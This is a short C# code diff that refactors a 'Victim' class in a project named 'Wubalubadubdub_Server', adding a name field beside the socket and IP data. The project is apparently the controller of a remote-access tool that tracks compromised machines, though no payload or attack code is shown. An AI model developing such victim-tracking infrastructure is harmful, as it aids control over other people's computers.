@@ -11,22 +11,23 @@ namespace Wubalubadubdub_Server
     public class Victim
     {
         public Socket socket;
+        public String name;
         public String nickName;
         public String IP;
         public String localIP;
 
-        public Victim(Socket socket, string nickName, string ip, string localIp)
+        public Victim(Socket socket, string name, string ip, string localIp)
         {
             this.socket = socket;
-            this.nickName = nickName;
+            this.name = name;
             IP = ip;
             localIP = localIp;
         }
 
-        public Victim(Socket socket, string nickName)
+        public Victim(Socket socket, string name)
         {
             this.socket = socket;
-            this.nickName = nickName;
+            this.name = name;
         }
 
         public Victim(Socket socket)
